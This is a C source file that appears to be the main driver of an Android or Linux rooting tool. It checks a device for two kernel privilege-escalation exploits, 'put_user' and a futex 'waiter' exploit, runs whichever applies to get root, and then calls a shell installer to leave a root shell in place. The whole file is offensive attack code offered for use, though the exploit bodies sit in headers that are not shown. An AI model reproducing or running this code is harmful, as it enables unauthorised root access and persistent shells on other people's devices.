#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "lib_put_user.h"
#include "waiter_exploit.h"
#include "shell_installer.h"
#include "log.h"


int main(int argc, char **argv) {
  int ret = 0;

  if(put_user_check_exploitability()) {
    LOGD("[CHECK] Put_user exploit available\n");
    if(fork())
      pthread_exit(1);
    else
      ret = put_user_get_root(argv[1], argv[0]);
  }
  else if(waiter_exploit_check_exploitability()) {
    LOGD("[CHECK] Waiter exploit available\n");
    if(fork())
      pthread_exit(1);
    else
      ret = waiter_exploit_get_root(argv[1], argv[0]);
  }
  else {
    LOGD("[CHECK] Device doesn't appear to be vulnerable.... giving up!!\n");
    ret = 0;
  }

  sleep(3);

  // Avoid sighup after fork
  setsid();
  
  if(ret) {
    LOGD("[CHECK] Exploit completed...PID %d\n", getpid());
    start_script();
  }
}
